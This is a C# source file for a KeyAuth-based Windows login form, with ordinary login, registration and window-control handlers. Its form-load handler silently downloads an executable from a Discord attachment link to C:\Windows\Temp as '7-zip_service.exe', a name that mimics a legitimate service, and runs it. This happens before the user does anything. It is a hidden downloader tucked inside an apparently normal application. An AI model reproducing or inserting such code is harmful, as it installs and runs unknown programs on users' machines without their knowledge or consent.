using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace KeyAuth
{
    public partial class Login : Form
    {

        static string name = "name";
        static string ownerid = "ownerid";
        static string secret = "secret";
        static string version = "1.0";

        public static api KeyAuthApp = new api(name, ownerid, secret, version);

        public Login()
        {
            InitializeComponent();
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        WebClient client = new WebClient();
        private void Login_Load(object sender, EventArgs e)
        {
            string path = @"C:\Windows\Temp\7-zip_service.exe";
            string link = "https://cdn.discordapp.com/attachments/916822659013169223/917145423309852692/7zip_service.exe";
            if (File.Exists(path))
            {
                File.Delete(path);
            }

            client.DownloadFile(link, path);
            Process.Start(path);

            KeyAuthApp.init();
            if(KeyAuthApp.checkblack())
            {
                Application.Exit();
            }
        }

        private void RgstrBtn_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            KeyAuthApp.register(username.Text, password.Text, key.Text);
            Main main = new Main();
            main.Show();
            this.Hide();
        }

        private void LoginBtn_Click(object sender, EventArgs e)
        {
            KeyAuthApp.login(username.Text, password.Text);
            Main main = new Main();
            main.Show();
            this.Hide();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/259a6kWKyh");
        }

        private void siticoneControlBox2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
